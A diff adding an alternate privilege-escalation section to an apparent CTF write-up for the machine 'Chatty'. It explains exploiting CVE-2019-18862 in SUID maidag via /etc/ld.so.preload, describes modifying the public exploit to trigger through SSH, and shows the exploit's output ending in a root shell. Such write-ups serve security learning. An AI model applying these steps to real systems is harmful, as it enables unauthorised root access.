@@ -55,3 +55,64 @@ This doesn't appear to be the `rocketchat` or `root` users' password.
 
 ### Privilege Escalation
 Linpeas flags sudo as vulnerable to [CVE-2021-4034](https://github.com/berdav/CVE-2021-4034). I git cloned the repository into `/dev/shm`, ran `make` and executed the exploit to get a root shell.
+
+### Privilege Escalation (alternate)
+When searching for SUID binaries, we see `/usr/local/sbin/maidag`. Searching for exploits, we find a [privesc vulnerability](https://github.com/bcoles/local-exploits/tree/master/CVE-2019-18862) for versions 2.0 - 3.7 (CVE-2019-18862):
+
+```shell-session
+$ maidag --version
+maidag (GNU Mailutils) 3.7
+Copyright (C) 2007-2019 Free Software Foundation, inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+```
+
+There are two exploits, one for cron and the other which overwrites `ld.so.preload`. The description of the cron exploit says it won't work on Ubuntu since we don't fully control the written data and cron on Ubuntu will error out on the malformed line that this exploit will write.
+
+By contrast, the comments in the other exploit say that `/etc/ld.so.preload` parsing is very forgiving and so will ignore the malformed line, so that's the one we'll use.
+
+The idea behind the exploit is that we can write arbitrary data to the `ld.so.preload` file. This file has the following permissions:
+
+```
+-rw------- 1 root user 73 Dec 24 19:26 /etc/ld.so.preload
+```
+
+However, the dynamic loader doesn't get elevated privileges even when executing a SUID binary, so it can't read the file. Therefore, we can't get root to execute the payload we'll write simply by calling a SUID binary. Instead, we need to trigger root to execute something.
+
+The exploit creates a binary at `/var/tmp/sh` that will initially be owned by the user that executes the exploit and will not be SUID. It also creates a library at `/tmp/libmaidag.so`, which when loaded will execute code to change the owner of `/var/tmp/sh` to `root:root` and make it SUID. Then it uses the vulnerability in `maidag` to add `/tmp/libmaidag.so` to `ld.so.preload`.
+
+To trigger root execution, the script tries making a bunch of connections with the SMTP port. However, this port is closed on Chatty, so I changed the script to connect to port 22, because we can see from `ps -eaf --forest | grep root` that root is running the SSH daemon:
+
+```shell-session
+rocketchat@chatty:/dev/shm$ ./exploit.ldpreload.sh 
+[+] /usr/local/sbin/maidag is set-uid
+[*] Compiling...
+[*] Writing stub to /tmp/stub ...
+[*] Adding /tmp/libmaidag.so to /etc/ld.so.preload...
+-rw------- 1 root rocketchat 70 Apr  4 21:27 /etc/ld.so.preload
+[*] Wait for your shell to be set-uid root: /var/tmp/sh
+[*] Spamming TCP connections to 127.0.0.1:25 ...
+SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
+Invalid SSH identification string.
+SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
+Invalid SSH identification string.
+SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
+Invalid SSH identification string.
+SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
+Invalid SSH identification string.
+SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
+Invalid SSH identification string.
+SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
+Invalid SSH identification string.
+SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
+Invalid SSH identification string.
+SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
+Invalid SSH identification string.
+SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
+Invalid SSH identification string.
+[+] Success:
+-rwsr-xr-x 1 root root 16792 Apr  4 21:27 /var/tmp/sh
+[*] Cleaning up ...
+root@chatty:/dev/shm#
+```
